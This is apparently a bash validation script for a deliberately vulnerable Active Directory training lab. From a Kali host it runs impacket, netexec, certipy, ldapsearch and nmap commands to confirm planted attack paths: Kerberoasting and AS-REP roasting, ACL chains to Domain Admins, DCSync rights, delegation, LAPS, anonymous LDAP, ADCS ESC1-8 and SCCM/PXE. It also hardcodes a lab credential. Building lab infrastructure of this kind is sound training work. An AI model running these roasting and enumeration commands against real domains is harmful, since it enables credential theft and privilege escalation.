#!/usr/bin/env bash
#
# verify-lab-attacks.sh - Attacker-side validation of DVAD lab attack paths.
#
# Run this FROM the Kali box (10.10.10.9). It performs quick, non-destructive
# offensive scans against the lab and reports, vector by vector, whether each
# intentional attack path / misconfiguration is actually reachable/exploitable.
#
# Output: colored [PASS]/[FAIL]/[SKIP]/[INFO] lines + a final summary.
# Exit code: 0 if no FAILs (SKIPs allowed), 1 if any vector FAILs.
#
# Tools are ASSUMED installed. Missing tools -> that check is SKIPPED with a
# warning (never auto-installed). All checks are read-only: enumerate, roast,
# read ACEs, and `certipy find` (metadata only). No cert issuance, no password
# resets, no exploitation side effects.
#
#   scp verify-attacks.sh kali@10.10.10.9:~/
#   ./verify-attacks.sh                 # uses built-in lab defaults
#   ./verify-attacks.sh --dc-ip 10.10.10.100 --user a.johnson --pass 'H3lpd3sk#2025!'
#
set -u

# ----------------------------------------------------------------------------
# Lab defaults (from inventory/lab-config.json + lab-users.json)
# ----------------------------------------------------------------------------
DOMAIN="dvad.lab"
DC_IP="10.10.10.100"
ADCS_IP="10.10.10.103"
SCCM_IP="10.10.10.104"
SRV01_IP="10.10.10.150"
BASE_DN="DC=dvad,DC=lab"

# Recon credential - any valid domain user works for enumeration/roasting.
RECON_USER="a.johnson"
RECON_PASS='H3lpd3sk#2025!'

# Known service-account SPN we expect to roast.
SQL_SPN="MSSQLSvc/SRV01.dvad.lab:1433"

# ----------------------------------------------------------------------------
# Arg parsing
# ----------------------------------------------------------------------------
while [ $# -gt 0 ]; do
    case "$1" in
        --domain)  DOMAIN="$2"; shift 2 ;;
        --dc-ip)   DC_IP="$2"; shift 2 ;;
        --adcs-ip) ADCS_IP="$2"; shift 2 ;;
        --sccm-ip) SCCM_IP="$2"; shift 2 ;;
        --srv01-ip) SRV01_IP="$2"; shift 2 ;;
        --user)    RECON_USER="$2"; shift 2 ;;
        --pass)    RECON_PASS="$2"; shift 2 ;;
        --base-dn) BASE_DN="$2"; shift 2 ;;
        -h|--help)
            grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
        *) echo "Unknown arg: $1" >&2; exit 2 ;;
    esac
done

# ----------------------------------------------------------------------------
# Colors + counters
# ----------------------------------------------------------------------------
if [ -t 1 ]; then
    RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; CYN=$'\e[36m'; GRY=$'\e[90m'; RST=$'\e[0m'
else
    RED=; GRN=; YEL=; CYN=; GRY=; RST=
fi

PASS_N=0; FAIL_N=0; SKIP_N=0

banner()  { printf '\n%s========== %s ==========%s\n' "$CYN" "$1" "$RST"; }
pass()    { PASS_N=$((PASS_N+1)); printf '  %s[PASS]%s %s\n' "$GRN" "$RST" "$1"; }
fail()    { FAIL_N=$((FAIL_N+1)); printf '  %s[FAIL]%s %s\n' "$RED" "$RST" "$1"; }
skip()    { SKIP_N=$((SKIP_N+1)); printf '  %s[SKIP]%s %s\n' "$YEL" "$RST" "$1"; }
info()    { printf '  %s[INFO]%s %s\n' "$GRY" "$RST" "$1"; }
evidence(){ printf '         %s%s%s\n' "$GRY" "$1" "$RST"; }

# Resolve a tool that may have several names; echoes the first found, else empty.
resolve() {
    local c
    for c in "$@"; do
        if command -v "$c" >/dev/null 2>&1; then echo "$c"; return 0; fi
    done
    return 1
}

NXC=$(resolve nxc netexec)
GETSPNS=$(resolve impacket-GetUserSPNs GetUserSPNs.py)
GETNP=$(resolve impacket-GetNPUsers GetNPUsers.py)
FINDDELEG=$(resolve impacket-findDelegation findDelegation.py)
DACLEDIT=$(resolve impacket-dacledit dacledit.py)
CERTIPY=$(resolve certipy certipy-ad)
LDAPSEARCH=$(resolve ldapsearch)
CURL=$(resolve curl)
NMAP=$(resolve nmap)

CREDS="${DOMAIN}/${RECON_USER}:${RECON_PASS}"

# dacledit read helper: prints raw output, returns it for grepping.
# Usage: dacl_read <principal-sam> <target-sam>
dacl_read() {
    [ -n "$DACLEDIT" ] || return 99
    "$DACLEDIT" -action read -principal "$1" -target "$2" \
        -dc-ip "$DC_IP" "$CREDS" 2>&1
}

# Check one ACL edge: principal should hold <right-regex> on target.
# Usage: check_ace <label> <principal> <target> <right-regex>
check_ace() {
    local label="$1" principal="$2" target="$3" rx="$4" out
    if [ -z "$DACLEDIT" ]; then skip "$label (dacledit not installed)"; return; fi
    out=$(dacl_read "$principal" "$target")
    if printf '%s' "$out" | grep -Eiq "$rx"; then
        pass "$label"
        evidence "$(printf '%s' "$out" | grep -Ei "ACE|$rx" | head -n 3 | tr '\n' ' ')"
    else
        fail "$label  (expected '$rx' for $principal on $target)"
    fi
}

# ============================================================================
banner "Tool preflight"
# ============================================================================
chk_tool() { if [ -n "$2" ]; then info "$1 -> $2"; else printf '  %s[warn]%s %s missing\n' "$YEL" "$RST" "$1"; fi; }
chk_tool "netexec (nxc)"       "$NXC"
chk_tool "GetUserSPNs"         "$GETSPNS"
chk_tool "GetNPUsers"          "$GETNP"
chk_tool "findDelegation"      "$FINDDELEG"
chk_tool "dacledit"            "$DACLEDIT"
chk_tool "certipy"             "$CERTIPY"
chk_tool "ldapsearch"          "$LDAPSEARCH"
chk_tool "curl"                "$CURL"
chk_tool "nmap (optional)"     "$NMAP"
info "Target: $DOMAIN  DC=$DC_IP  ADCS=$ADCS_IP  SCCM=$SCCM_IP  SRV01=$SRV01_IP"
info "Recon cred: $RECON_USER"

# ============================================================================
banner "Chain 1: Kerberoasting (svc_sqldb = DA, weak password)"
# ============================================================================
if [ -n "$GETSPNS" ]; then
    OUT=$("$GETSPNS" "$CREDS" -dc-ip "$DC_IP" -request -outputfile /dev/null 2>&1)
    if printf '%s' "$OUT" | grep -q 'svc_sqldb'; then
        pass "svc_sqldb is Kerberoastable"
        evidence "$(printf '%s' "$OUT" | grep -i 'svc_sqldb' | head -n 1)"
        if printf '%s' "$OUT" | grep -q '\$krb5tgs\$'; then
            evidence "TGS hash captured (crackable offline)"
        fi
    else
        fail "svc_sqldb SPN not returned by GetUserSPNs"
    fi
    # Bonus SPN accounts that should also be roastable.
    for a in svc_web svc_exchange svc_print svc_fileshare; do
        printf '%s' "$OUT" | grep -qi "$a" && info "also roastable: $a"
    done
else
    skip "Kerberoast (GetUserSPNs not installed)"
fi

# ============================================================================
banner "Chain 2: AS-REP roast + ACL chain to Domain Admins"
# ============================================================================
# 2a: AS-REP roast j.martinez (DoesNotRequirePreAuth)
if [ -n "$GETNP" ]; then
    OUT=$("$GETNP" "$CREDS" -dc-ip "$DC_IP" -request -format hashcat 2>&1)
    if printf '%s' "$OUT" | grep -qi 'j.martinez'; then
        pass "j.martinez is AS-REP roastable (no pre-auth)"
        evidence "$(printf '%s' "$OUT" | grep -i 'krb5asrep\|j.martinez' | head -n 1)"
    else
        fail "j.martinez not flagged DONT_REQ_PREAUTH"
    fi
else
    skip "AS-REP roast (GetNPUsers not installed)"
fi
# 2b/2c/2d: the ACL chain edges
check_ace "GenericWrite j.martinez -> r.chen"          "j.martinez" "r.chen"        "GenericWrite|GENERIC_WRITE|WriteProperty"
check_ace "WriteOwner r.chen -> Server-Admins"         "r.chen"     "Server-Admins" "WriteOwner|WRITE_OWNER"
check_ace "WriteDacl Server-Admins -> Domain Admins"   "Server-Admins" "Domain Admins" "WriteDacl|WRITE_DAC"

# ============================================================================
banner "Chain 3: GenericAll -> Kerberoast -> Backup Operators"
# ============================================================================
check_ace "GenericAll a.johnson -> Helpdesk-Operators"      "a.johnson"         "Helpdesk-Operators" "GenericAll|GENERIC_ALL"
check_ace "GenericWrite Helpdesk-Operators -> svc_backup"   "Helpdesk-Operators" "svc_backup"        "GenericWrite|GENERIC_WRITE|WriteProperty"
if [ -n "$NXC" ]; then
    OUT=$("$NXC" ldap "$DC_IP" -u "$RECON_USER" -p "$RECON_PASS" \
          --query "(sAMAccountName=svc_backup)" "memberOf" 2>&1)
    if printf '%s' "$OUT" | grep -qi 'Backup Operators'; then
        pass "svc_backup is in Backup Operators"
    else
        info "Could not confirm svc_backup -> Backup Operators via nxc (check manually)"
    fi
else
    skip "Backup Operators membership (nxc not installed)"
fi

# ============================================================================
banner "Chain 4: ForceChangePassword -> Self-Membership -> Enterprise Admins"
# ============================================================================
check_ace "ForceChangePassword m.wilson -> k.lee"          "m.wilson"        "k.lee"             "Force-Change-Password|ForceChangePassword|Reset Password|User-Force-Change"
check_ace "Self-Membership k.lee -> Project-Phoenix"       "k.lee"           "Project-Phoenix"   "Self-Membership|Self \(Self-Membership\)|WriteProperty|Self"
check_ace "WriteDacl Project-Phoenix -> Enterprise Admins" "Project-Phoenix" "Enterprise Admins" "WriteDacl|WRITE_DAC"

# ============================================================================
banner "Chain 5: WriteOwner -> GMSA -> DCSync"
# ============================================================================
check_ace "WriteOwner d.patel -> GMSA-Readers" "d.patel" "GMSA-Readers" "WriteOwner|WRITE_OWNER"
if [ -n "$NXC" ]; then
    OUT=$("$NXC" ldap "$DC_IP" -u "$RECON_USER" -p "$RECON_PASS" --gmsa 2>&1)
    if printf '%s' "$OUT" | grep -qi 'gmsa_svc'; then
        pass "gmsa_svc\$ present (GMSA readable by GMSA-Readers)"
        evidence "$(printf '%s' "$OUT" | grep -i 'gmsa' | head -n 1)"
    else
        info "gmsa_svc\$ not returned by --gmsa with this user (expected: only GMSA-Readers can read)"
    fi
else
    skip "GMSA enumeration (nxc not installed)"
fi
# DCSync replication rights granted to gmsa_svc$ on the domain root.
check_ace "DCSync rights gmsa_svc\$ -> domain root" "gmsa_svc\$" "$DOMAIN" "Replicating Directory Changes|DS-Replication|1131f6a"

# ============================================================================
banner "Chain 6: Delegation (Unconstrained / Constrained / RBCD)"
# ============================================================================
if [ -n "$FINDDELEG" ]; then
    OUT=$("$FINDDELEG" "$CREDS" -dc-ip "$DC_IP" 2>&1)
    if printf '%s' "$OUT" | grep -qiE 'SRV01.*Unconstrained|Unconstrained.*SRV01'; then
        pass "6a Unconstrained delegation on SRV01\$"
    else
        fail "6a SRV01 unconstrained delegation not found"
    fi
    if printf '%s' "$OUT" | grep -qi 'svc_web'; then
        pass "6b Constrained delegation on svc_web (-> CIFS/ROOTDC)"
        evidence "$(printf '%s' "$OUT" | grep -i 'svc_web' | head -n 1)"
    else
        fail "6b svc_web constrained delegation not found"
    fi
    info "findDelegation output:"
    printf '%s\n' "$OUT" | sed 's/^/         /' | grep -iE 'AccountName|Unconstrained|Constrained|svc_web|SRV01' | head -n 8
else
    skip "6a/6b delegation (findDelegation not installed)"
fi
# 6c: RBCD - l.garcia can write to ADCS$ (GenericWrite)
check_ace "6c RBCD: GenericWrite l.garcia -> ADCS\$" "l.garcia" "ADCS\$" "GenericWrite|GENERIC_WRITE|WriteProperty|AllowedToAct"

# ============================================================================
banner "Chain 7: LAPS (t.brown -> SRV01\$ AllExtendedRights)"
# ============================================================================
check_ace "AllExtendedRights t.brown -> SRV01\$" "t.brown" "SRV01\$" "All-Extended|AllExtendedRights|ExtendedRight|CONTROL_ACCESS"
if [ -n "$NXC" ]; then
    OUT=$("$NXC" ldap "$DC_IP" -u "$RECON_USER" -p "$RECON_PASS" -M laps 2>&1)
    if printf '%s' "$OUT" | grep -qiE 'ms-?Mcs-?AdmPwd|SRV01.*:'; then
        pass "LAPS attribute (ms-Mcs-AdmPwd) present on SRV01"
        evidence "$(printf '%s' "$OUT" | grep -iE 'SRV01|AdmPwd' | head -n 1)"
    else
        info "LAPS password not readable by $RECON_USER (expected: only authorized readers); attribute presence requires a privileged reader"
    fi
else
    skip "LAPS read (nxc not installed)"
fi

# ============================================================================
banner "Chain 8: Anonymous LDAP bind (dSHeuristics)"
# ============================================================================
if [ -n "$LDAPSEARCH" ]; then
    OUT=$("$LDAPSEARCH" -x -H "ldap://$DC_IP" -b "$BASE_DN" \
          '(sAMAccountName=a.johnson)' sAMAccountName 2>&1)
    if printf '%s' "$OUT" | grep -qi 'sAMAccountName: a.johnson'; then
        pass "Anonymous LDAP bind returns directory objects"
        evidence "anonymous query resolved a.johnson without credentials"
    elif printf '%s' "$OUT" | grep -qiE 'operationsError|in order to perform this operation|bind'; then
        fail "Anonymous bind rejected (dSHeuristics not set?)"
    else
        info "Inconclusive anonymous-bind result; inspect manually"
    fi
    # Best-effort: read the dSHeuristics value itself.
    OUT2=$("$LDAPSEARCH" -x -H "ldap://$DC_IP" \
        -b "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$BASE_DN" \
        dSHeuristics 2>&1)
    printf '%s' "$OUT2" | grep -qi 'dSHeuristics' && \
        evidence "$(printf '%s' "$OUT2" | grep -i dSHeuristics | head -n 1)"
else
    skip "Anonymous LDAP bind (ldapsearch not installed)"
fi

# ============================================================================
banner "Chain 9: ADCS ESC1-ESC8"
# ============================================================================
if [ -n "$CERTIPY" ]; then
    OUT=$("$CERTIPY" find -u "${RECON_USER}@${DOMAIN}" -p "$RECON_PASS" \
          -dc-ip "$DC_IP" -vulnerable -stdout 2>&1)
    FOUND=0
    for esc in ESC1 ESC2 ESC3 ESC4 ESC5 ESC6 ESC7; do
        if printf '%s' "$OUT" | grep -qi "$esc"; then
            pass "ADCS $esc detected by certipy"
            FOUND=$((FOUND+1))
        else
            info "$esc not reported (may need a different enrollee or template not vuln)"
        fi
    done
    [ "$FOUND" -eq 0 ] && fail "certipy found no vulnerable templates - check ADCS provisioning"
else
    skip "ADCS ESC1-7 (certipy not installed)"
fi
# ESC8: HTTP web enrollment with NTLM (relay-vulnerable)
if [ -n "$CURL" ]; then
    OUT=$("$CURL" -s -i -m 10 "http://${ADCS_IP}/certsrv/" 2>&1)
    if printf '%s' "$OUT" | grep -qiE 'WWW-Authenticate:\s*(NTLM|Negotiate)'; then
        pass "ESC8: /certsrv/ reachable over HTTP with NTLM (relay-vulnerable)"
        evidence "$(printf '%s' "$OUT" | grep -i 'WWW-Authenticate' | head -n 1 | tr -d '\r')"
    elif printf '%s' "$OUT" | grep -qiE 'HTTP/.* 40[13]'; then
        info "ESC8: /certsrv/ responded but no NTLM challenge header seen - verify auth config"
    else
        fail "ESC8: /certsrv/ not reachable over HTTP on $ADCS_IP"
    fi
else
    skip "ESC8 web enrollment (curl not installed)"
fi

# ============================================================================
banner "Chain 10: SCCM (best-effort; deep cred vectors need manual tooling)"
# ============================================================================
if [ -n "$NXC" ]; then
    OUT=$("$NXC" smb "$SCCM_IP" -u "$RECON_USER" -p "$RECON_PASS" 2>&1)
    if printf '%s' "$OUT" | grep -qiE 'SCCM|10\.10\.10\.104|\[\+\]'; then
        pass "SCCM host reachable / SMB authenticated"
        evidence "$(printf '%s' "$OUT" | grep -iE 'SMB|\[\+\]' | head -n 1)"
    else
        info "SCCM SMB check inconclusive"
    fi
    # SCCM module (newer netexec): enumerates management point.
    "$NXC" smb "$SCCM_IP" -u "$RECON_USER" -p "$RECON_PASS" -M sccm >/dev/null 2>&1 \
        && info "nxc 'sccm' module ran (review its output for the MP)"
else
    skip "SCCM SMB recon (nxc not installed)"
fi
# PXE responder probe (UDP/69 TFTP) - optional, needs nmap.
if [ -n "$NMAP" ]; then
    if "$NMAP" -sU -p69 --open -Pn "$SCCM_IP" 2>/dev/null | grep -qi '69/udp.*open'; then
        pass "PXE/TFTP (UDP 69) open on SCCM - PXE attack surface present"
    else
        info "TFTP/69 not detected open (PXE may use WDS on a different responder)"
    fi
else
    skip "PXE/TFTP probe (nmap not installed)"
fi
info "Deep SCCM creds (NAA, task-sequence variables, client-push) require a"
info "registered device + policy request. Follow up manually with sccmhunter / pxethief:"
info "  sccmhunter find  -u $RECON_USER -p '***' -d $DOMAIN -dc-ip $DC_IP"
info "  pxethief 2 <pxe-server-ip>     # pull NAA/TS variables from boot media"

# ============================================================================
banner "Summary"
# ============================================================================
printf '  %sPASS: %d%s   %sFAIL: %d%s   %sSKIP: %d%s\n' \
    "$GRN" "$PASS_N" "$RST" "$RED" "$FAIL_N" "$RST" "$YEL" "$SKIP_N" "$RST"
if [ "$FAIL_N" -eq 0 ]; then
    printf '  %sAll validated attack paths are correctly implemented.%s\n' "$GRN" "$RST"
    [ "$SKIP_N" -gt 0 ] && printf '  %s(%d checks skipped - install missing tools for full coverage)%s\n' "$YEL" "$SKIP_N" "$RST"
    exit 0
else
    printf '  %s%d attack path(s) FAILED validation - review output above.%s\n' "$RED" "$FAIL_N" "$RST"
    exit 1
fi
